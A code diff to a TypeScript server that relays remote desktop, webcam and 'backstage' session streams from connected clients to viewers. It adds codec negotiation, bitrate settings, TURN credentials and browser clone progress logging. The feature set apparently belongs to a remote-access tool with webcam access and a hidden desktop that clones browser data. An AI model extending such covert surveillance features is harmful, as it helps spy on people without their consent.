@@ -4,6 +4,7 @@ import { existsSync, readFileSync } from "fs";
 import path from "path";
 import * as clientManager from "../clientManager";
 import { logger } from "../logger";
+import { negotiateDesktopCodec } from "./desktop-codec-negotiation";
 import { metrics } from "../metrics";
 import { encodeMessage } from "../protocol";
 import { resolveRuntimeRoot } from "./runtime-paths";
@@ -13,6 +14,7 @@ import type { ClientInfo } from "../types";
 import { canUserAccessClient } from "../users";
 import { setClientWebcamInfo } from "../db";
 import { issueWebrtcPublishToken, webrtcStreamPathFor } from "./routes/webrtc-routes";
+import { issueTurnIceServers } from "./turn-credentials";
 import {
   buildViewerFrameBuffer,
   decodeViewerPayload,
@@ -188,6 +190,13 @@ function broadcastFrameToViewers(
 
 const rdSendStats = { lastLog: 0, frames: 0, sendMs: 0, bytes: 0 };
 const rdDebugFrameLogAt = new Map<string, number>();
+const rdCanvasFrameAckPending = new Map<string, string>();
+const AUTOMATIC_DESKTOP_KEYFRAME_REASONS: Record<string, true> = {
+  viewer_frame_gap: true,
+  decoder_backpressure: true,
+  h264_decoder_keyframe_required: true,
+  hevc_decoder_keyframe_required: true,
+};
 export const rdStreamingState = new Map<string, {
   isStreaming: boolean;
   display: number;
@@ -197,6 +206,8 @@ export const rdStreamingState = new Map<string, {
   duplication: boolean;
   maxHeight: number;
   maxFps: number;
+  bitrateMbps: number;
+  bitrateAdaptive: boolean;
   lastFps: number;
   lastFrameAt: number;
   startedAt: number;
@@ -221,7 +232,9 @@ function defaultRdStreamingState() {
     softwareH264: false,
     duplication: false,
     maxHeight: 0,
-    maxFps: 30,
+    maxFps: 120,
+    bitrateMbps: 0,
+    bitrateAdaptive: false,
     lastFps: 0,
     lastFrameAt: 0,
     startedAt: 0,
@@ -374,6 +387,18 @@ export function notifyRemoteDesktopStatus(clientId: string, status: string, reas
   }
 }
 
+export function requestRemoteDesktopKeyframeAfterScreenshot(clientId: string): boolean {
+  const state = rdStreamingState.get(clientId);
+  if (!state?.isStreaming || String(state.codec || "").toLowerCase() !== "hevc") {
+    return false;
+  }
+  return sendDesktopCommand(
+    clientManager.getClient(clientId),
+    "desktop_request_keyframe",
+    { reason: "post_screenshot_hevc_recovery" },
+  );
+}
+
 export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
   const payload = decodeViewerPayload(raw);
   if (!payload) return;
@@ -387,14 +412,28 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
 
   const state = rdStreamingState.get(clientId) || defaultRdStreamingState();
 
-  logger.debug(`[rd] inbound viewer msg type=${payload.type} client=${clientId}`);
+  if (payload.type !== "desktop_decode_pressure") {
+    logger.debug(`[rd] inbound viewer msg type=${payload.type} client=${clientId}`);
+  }
   switch (payload.type) {
     case "desktop_encoder_capabilities":
+      ws.data.rdDecoderCodecs = Array.isArray((payload as any).decoderCodecs)
+        ? (payload as any).decoderCodecs.map((codec: unknown) => String(codec || "").trim().toLowerCase()).filter(Boolean).slice(0, 8)
+        : ["h264", "jpeg", "raw"];
+      ws.data.rdPreferredCodecs = Array.isArray((payload as any).preferredCodecs)
+        ? (payload as any).preferredCodecs.map((codec: unknown) => String(codec || "").trim().toLowerCase()).filter(Boolean).slice(0, 8)
+        : ["h264", "jpeg", "raw"];
+      ws.data.rdCodecTransport = ["webrtc", "relayed", "p2p"].includes(String((payload as any).transport || "").toLowerCase())
+        ? "webrtc"
+        : "websocket";
       sendDesktopCommand(target, "desktop_encoder_capabilities", {
         display: Number((payload as any).display) || 0,
       });
       break;
     case "desktop_start":
+      (ws.data as any).rdCanvasFlowControl = (payload as any).canvasFlowControl === true && (payload as any).webrtc !== true;
+      (ws.data as any).rdCanvasBackpressure = false;
+      releaseCanvasFrameAck(clientId);
       logger.debug(`[rd-debug] desktop_start requested client=${clientId} session=${ws.data.sessionId || ""} state=${JSON.stringify(state)} viewers=${sessionManager.getRdSessionsForClient(clientId).length} webrtc=${(payload as any).webrtc === true}`);
       if (!state.isStreaming) {
         const targetOs = String(target.os || "").toLowerCase();
@@ -424,6 +463,7 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
             kind: "desktop",
             hasVideo: true,
             hasAudio: false,
+            iceServers: issueTurnIceServers(`${clientId}:desktop:whip`),
           });
           safeSendViewer(ws, {
             type: "webrtc_ready",
@@ -433,6 +473,7 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
         }
         safeSendViewer(ws, { type: "status", status: "starting" });
         sendDesktopCommand(target, "desktop_set_fps", { fps: clampDesktopFps(state.maxFps) });
+        sendDesktopCommand(target, "desktop_set_bitrate", { bitrateMbps: state.bitrateMbps || 0, adaptive: state.bitrateAdaptive });
         sendDesktopCommand(target, "desktop_start", {});
         state.isStreaming = true;
         state.startedAt = Date.now();
@@ -444,6 +485,7 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
         if (lastFrameAgeMs > 3000 && startAgeMs > 3000) {
           logger.info(`[rd-debug] desktop_start reasserting stale stream client=${clientId} lastFrameAgeMs=${Number.isFinite(lastFrameAgeMs) ? lastFrameAgeMs : -1} state=${JSON.stringify(state)} viewers=${sessionManager.getRdSessionsForClient(clientId).length}`);
           sendDesktopCommand(target, "desktop_set_fps", { fps: clampDesktopFps(state.maxFps) });
+          sendDesktopCommand(target, "desktop_set_bitrate", { bitrateMbps: state.bitrateMbps || 0, adaptive: state.bitrateAdaptive });
           sendDesktopCommand(target, "desktop_start", {});
           safeSendViewer(ws, { type: "status", status: "starting" });
           state.isStreaming = true;
@@ -459,15 +501,10 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
         }
       }
       break;
-    case "desktop_request_keyframe": {
-      if (shouldRequestDesktopKeyframe(clientId)) {
-        sendDesktopCommand(target, "desktop_request_keyframe", {
-          reason: String((payload as any).reason || "viewer_request"),
-        });
-      }
-      break;
-    }
     case "desktop_stop": {
+      (ws.data as any).rdCanvasFlowControl = false;
+      (ws.data as any).rdCanvasBackpressure = false;
+      releaseCanvasFrameAck(clientId);
       const otherViewers = sessionManager.getRdSessionsForClient(clientId)
         .filter(s => s.id !== ws.data.sessionId);
       logger.debug(`[rd-debug] desktop_stop requested client=${clientId} session=${ws.data.sessionId || ""} otherViewers=${otherViewers.length} state=${JSON.stringify(state)}`);
@@ -492,12 +529,32 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
       safeSendViewer(ws, { type: "status", status: "stopped" });
       break;
     }
+    case "desktop_request_keyframe": {
+      const requestedReason = String(payload.reason || "");
+      const isAutomatic = !!AUTOMATIC_DESKTOP_KEYFRAME_REASONS[requestedReason];
+      // Automatic backpressure reasons reach the agent (throttled) even before the
+      // stream is marked active; manual viewer requests only while streaming.
+      if (isAutomatic ? shouldRequestDesktopKeyframe(clientId) : state.isStreaming) {
+        sendDesktopCommand(target, "desktop_request_keyframe", {
+          reason: isAutomatic ? requestedReason : "manual_viewer",
+        });
+      }
+      break;
+    }
     case "desktop_record_start": {
       if (!state.isStreaming) {
         safeSendViewer(ws, {
           type: "recording_status",
           recording: null,
           error: "Start the remote desktop stream before recording.",
+        });
+        break;
+      }
+      if (String(state.codec || "").toLowerCase() === "hevc") {
+        safeSendViewer(ws, {
+          type: "recording_status",
+          recording: null,
+          error: "HEVC stream recording is not supported yet. Switch the stream codec to H.264 or JPEG first.",
         });
         break;
       }
@@ -611,6 +668,25 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
       }
       break;
     }
+    case "desktop_decode_pressure": {
+      if (!(ws.data as any).rdCanvasFlowControl) break;
+      const active = (payload as any).active === true;
+      (ws.data as any).rdCanvasBackpressure = active;
+      if (!active) releaseCanvasFrameAck(clientId, ws.data.sessionId);
+      break;
+    }
+    case "desktop_set_bitrate": {
+      const newBitrateMbps = Math.max(0, Math.min(50, Math.floor(Number((payload as any).bitrateMbps) || 0)));
+      const adaptive = (payload as any).adaptive === true;
+      if (state.bitrateMbps !== newBitrateMbps || state.bitrateAdaptive !== adaptive) {
+        sendDesktopCommand(target, "desktop_set_bitrate", { bitrateMbps: newBitrateMbps, adaptive });
+        state.bitrateMbps = newBitrateMbps;
+        state.bitrateAdaptive = adaptive;
+        rdStreamingState.set(clientId, state);
+        logger.debug(`[rd] set target bitrate=${newBitrateMbps || "auto"} Mbps adaptive=${adaptive}`);
+      }
+      break;
+    }
     case "desktop_set_duplication": {
       const enabled = !!payload.enabled;
       if (state.duplication !== enabled) {
@@ -699,7 +775,7 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
       const sdp = typeof (payload as any).sdp === "string" ? (payload as any).sdp : "";
       if (!sdp) break;
       const sessionId = createP2PSession(ws, clientId, "desktop");
-      sendDesktopCommand(target, "webrtc_p2p_offer", { sessionId, sdp, kind: "desktop", hasVideo: true, hasAudio: false });
+      sendDesktopCommand(target, "webrtc_p2p_offer", { sessionId, sdp, kind: "desktop", hasVideo: true, hasAudio: false, iceServers: issueTurnIceServers(`${clientId}:desktop:${sessionId}`) });
       break;
     }
     case "webrtc_p2p_ice": {
@@ -762,6 +838,11 @@ export function handleWebrtcP2PIce(_clientId: string, payload: any) {
 }
 
 export function cleanupViewerP2P(ws: ServerWebSocket<SocketData>) {
+  if (ws.data.role === "rd_viewer") {
+    (ws.data as any).rdCanvasFlowControl = false;
+    (ws.data as any).rdCanvasBackpressure = false;
+    releaseCanvasFrameAck(ws.data.clientId, ws.data.sessionId);
+  }
   const cleared = clearP2PSessionForViewer(ws);
   if (!cleared) return;
   const target = clientManager.getClient(cleared.clientId);
@@ -806,6 +887,15 @@ function broadcastRemoteDesktopFrame(clientId: string, bytes: Uint8Array, header
   const buf = buildViewerFrameBuffer(bytes, header);
   const sessions = sessionManager.getRdSessionsForClient(clientId);
   const result = broadcastFrameToViewers(sessions, buf, header);
+  if (result.sent) {
+    const controller = sessions.find((session) =>
+      (session.viewer.data as any).rdCanvasFlowControl === true &&
+      (session.viewer.data as any).rdCanvasBackpressure === true
+    );
+    if (controller?.viewer.data.sessionId) {
+      rdCanvasFrameAckPending.set(clientId, controller.viewer.data.sessionId);
+    }
+  }
   if (result.dropped && shouldRequestDesktopKeyframe(clientId)) {
     const target = clientManager.getClient(clientId);
     if (target) {
@@ -815,7 +905,7 @@ function broadcastRemoteDesktopFrame(clientId: string, bytes: Uint8Array, header
       });
     }
   }
-  return result.sent || result.viewers === 0;
+  return (result.sent && !rdCanvasFrameAckPending.has(clientId)) || result.viewers === 0;
 }
 
 (globalThis as any).__rdBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
@@ -897,15 +987,23 @@ export function handleWebcamDevices(clientId: string, payload: any) {
   }
 }
 
-export function handlebackstageCloneProgress(clientId: string, payload: any) {
+export function handlebackstageCloneProgress(clientId: string, payload: unknown) {
+  const data = payload && typeof payload === "object" ? payload as Record<string, unknown> : {};
+  const browser = String(data.browser || "");
+  const status = String(data.status || "");
+  if (status.startsWith("copying|") || status.startsWith("retrying|")) {
+    logger.debug(`[backstage] clone client=${clientId} browser=${browser} status=${status}`);
+  } else if (status.startsWith("failed|") || status.startsWith("skipped|") || status.startsWith("done_with_errors|")) {
+    logger.warn(`[backstage] clone client=${clientId} browser=${browser} status=${status}`);
+  }
   for (const session of sessionManager.getbackstageSessionsForClient(clientId)) {
     safeSendViewer(session.viewer, {
       type: "backstage_clone_progress",
-      browser: String(payload.browser || ""),
-      percent: Number(payload.percent) || 0,
-      copiedBytes: Number(payload.copiedBytes) || 0,
-      totalBytes: Number(payload.totalBytes) || 0,
-      status: String(payload.status || ""),
+      browser,
+      percent: Number(data.percent) || 0,
+      copiedBytes: Number(data.copiedBytes) || 0,
+      totalBytes: Number(data.totalBytes) || 0,
+      status,
     });
   }
 }
@@ -1095,6 +1193,7 @@ export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: 
             kind: "webcam",
             hasVideo: true,
             hasAudio: false,
+            iceServers: issueTurnIceServers(`${clientId}:webcam:whip`),
           });
           safeSendViewer(ws, {
             type: "webrtc_ready",
@@ -1143,7 +1242,7 @@ export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: 
       const sdp = typeof (payload as any).sdp === "string" ? (payload as any).sdp : "";
       if (!sdp) break;
       const sessionId = createP2PSession(ws, clientId, "webcam");
-      sendDesktopCommand(target, "webrtc_p2p_offer", { sessionId, sdp, kind: "webcam", hasVideo: true, hasAudio: false });
+      sendDesktopCommand(target, "webrtc_p2p_offer", { sessionId, sdp, kind: "webcam", hasVideo: true, hasAudio: false, iceServers: issueTurnIceServers(`${clientId}:webcam:${sessionId}`) });
       break;
     }
     case "webrtc_p2p_ice": {
@@ -1236,6 +1335,7 @@ export function handlebackstageViewerMessage(ws: ServerWebSocket<SocketData>, ra
             kind: "backstage",
             hasVideo: true,
             hasAudio: false,
+            iceServers: issueTurnIceServers(`${clientId}:backstage:whip`),
           });
           safeSendViewer(ws, {
             type: "webrtc_ready",
@@ -1459,7 +1559,7 @@ export function handlebackstageViewerMessage(ws: ServerWebSocket<SocketData>, ra
       const sdp = typeof (payload as any).sdp === "string" ? (payload as any).sdp : "";
       if (!sdp) break;
       const sessionId = createP2PSession(ws, clientId, "backstage");
-      sendbackstageCommand(target, "webrtc_p2p_offer", { sessionId, sdp, kind: "backstage", hasVideo: true, hasAudio: false });
+      sendbackstageCommand(target, "webrtc_p2p_offer", { sessionId, sdp, kind: "backstage", hasVideo: true, hasAudio: false, iceServers: issueTurnIceServers(`${clientId}:backstage:${sessionId}`) });
       break;
     }
     case "webrtc_p2p_ice": {
@@ -1505,8 +1605,104 @@ export function sendbackstageCommand(target: ClientInfo | undefined, commandType
 }
 
 export function handleDesktopEncoderCapabilities(clientId: string, payload: any) {
+  const encoderCodecs = Array.isArray(payload?.codecs) && payload.codecs.length > 0
+    ? payload.codecs
+    : [
+        { codec: "h264", transports: ["websocket", "webrtc"] },
+        { codec: "jpeg", transports: ["websocket"] },
+        { codec: "raw", transports: ["websocket"] },
+      ];
+  const sessions = sessionManager.getRdSessionsForClient(clientId);
+  const negotiations = sessions.map((session) => negotiateDesktopCodec({
+      encoderCodecs,
+      decoderCodecs: session.viewer.data.rdDecoderCodecs || ["h264", "jpeg", "raw"],
+      preferredCodecs: session.viewer.data.rdPreferredCodecs,
+      transport: session.viewer.data.rdCodecTransport,
+    }));
+  const sharedFallbackCodecs = negotiations.length > 0
+    ? negotiations[0].fallbackCodecs.filter((codec) =>
+        negotiations.every((negotiation) => negotiation.fallbackCodecs.includes(codec)),
+      )
+    : [];
+  const selectedCodec = sharedFallbackCodecs[0] || "";
+
+  for (let index = 0; index < sessions.length; index++) {
+    const session = sessions[index];
+    const negotiation = {
+      ...negotiations[index],
+      selectedCodec,
+      fallbackCodecs: sharedFallbackCodecs,
+    };
+    session.viewer.data.rdSelectedCodec = selectedCodec;
+    safeSendViewer(session.viewer, {
+      ...payload,
+      codecs: encoderCodecs,
+      negotiation,
+      selectedCodec,
+      fallbackCodecs: sharedFallbackCodecs,
+      transport: negotiation.transport,
+    });
+  }
+}
+
+function releaseCanvasFrameAck(clientId: string, sessionId?: string): boolean {
+  const controllerSessionId = rdCanvasFrameAckPending.get(clientId);
+  if (!controllerSessionId || (sessionId && controllerSessionId !== sessionId)) return false;
+  rdCanvasFrameAckPending.delete(clientId);
+  const target = clientManager.getClient(clientId);
+  if (!target) return false;
+  try {
+    target.ws.send(encodeMessage({ type: "frame_ack" }));
+    return true;
+  } catch (err) {
+    logger.debug(`[rd] canvas frame ack failed client=${clientId}: ${(err as Error).message}`);
+    return false;
+  }
+}
+
+export function handleDesktopCursor(clientId: string, payload: unknown) {
+  const data = payload && typeof payload === "object" ? payload as Record<string, unknown> : {};
+  const image = data.image instanceof Uint8Array && data.image.byteLength <= 256 * 1024
+    ? data.image
+    : undefined;
+  const cursor = {
+    type: "desktop_cursor",
+    x: Math.max(0, Math.floor(Number(data.x) || 0)),
+    y: Math.max(0, Math.floor(Number(data.y) || 0)),
+    width: Math.max(0, Math.floor(Number(data.width) || 0)),
+    height: Math.max(0, Math.floor(Number(data.height) || 0)),
+    visible: data.visible === true,
+    ...(image
+      ? {
+          cursorWidth: Math.max(1, Math.floor(Number(data.cursorWidth) || 1)),
+          cursorHeight: Math.max(1, Math.floor(Number(data.cursorHeight) || 1)),
+          hotspotX: Math.max(0, Math.floor(Number(data.hotspotX) || 0)),
+          hotspotY: Math.max(0, Math.floor(Number(data.hotspotY) || 0)),
+          image,
+        }
+      : {}),
+  };
   for (const session of sessionManager.getRdSessionsForClient(clientId)) {
-    safeSendViewer(session.viewer, payload);
+    safeSendViewer(session.viewer, cursor, "rd-cursor");
+  }
+}
+
+export function handleDesktopStreamStats(clientId: string, payload: any) {
+  const stats = {
+    type: "desktop_stream_stats",
+    fps: Math.max(0, Number(payload?.fps) || 0),
+    format: String(payload?.format || ""),
+    bytes: Math.max(0, Number(payload?.bytes) || 0),
+    width: Math.max(0, Number(payload?.width) || 0),
+    height: Math.max(0, Number(payload?.height) || 0),
+    captureMs: Math.max(0, Number(payload?.captureMs) || 0),
+    encodeMs: Math.max(0, Number(payload?.encodeMs) || 0),
+    sendMs: Math.max(0, Number(payload?.sendMs) || 0),
+    totalMs: Math.max(0, Number(payload?.totalMs) || 0),
+    transport: String(payload?.transport || ""),
+  };
+  for (const session of sessionManager.getRdSessionsForClient(clientId)) {
+    safeSendViewer(session.viewer, stats, "rd-stats");
   }
 }
 
